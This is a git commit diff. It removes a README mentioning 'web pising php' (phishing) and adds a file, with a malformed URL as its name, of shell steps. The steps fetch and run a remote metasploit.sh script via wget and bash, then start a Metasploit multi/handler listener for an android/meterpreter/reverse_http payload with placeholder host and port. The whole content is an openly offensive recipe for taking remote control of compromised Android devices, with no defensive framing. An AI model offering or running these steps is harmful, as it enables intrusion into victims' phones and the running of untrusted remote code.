e907b30c3469bf4127949df54b45936822b7af4f
ansakasil <109841238+ansakasil@users.noreply.github.com>
2022-07-26 09:29:57 +0700

    Update and rename README.md to https:/github.com/1Tech-X/Auxilus.github.io/blob/master/metasploit.sh

--- README.md
+++
@@ -1,2 +0,0 @@
-# affa
-web pising php
---
+++ https:/github.com/1Tech-X/Auxilus.github.io/blob/master/metasploit.sh
@@ -0,0 +1,23 @@
+$ apt-get update
+
+$ apt-get upgrade
+
+$ apt-get install wget
+
+$ wget https://github.com/1Tech-X/Auxilus.github.io/blob/master/metasploit.sh
+
+$ cd Home
+
+$ bash Metasploit.sh
+
+$ msfconsole
+
+$ use exploit/multi/handler
+
+$ set payload android/meterpreter/reverse_http
+
+$ set lhost = (IP Anda)
+
+$ set lport = 8080
+
+$ exploit
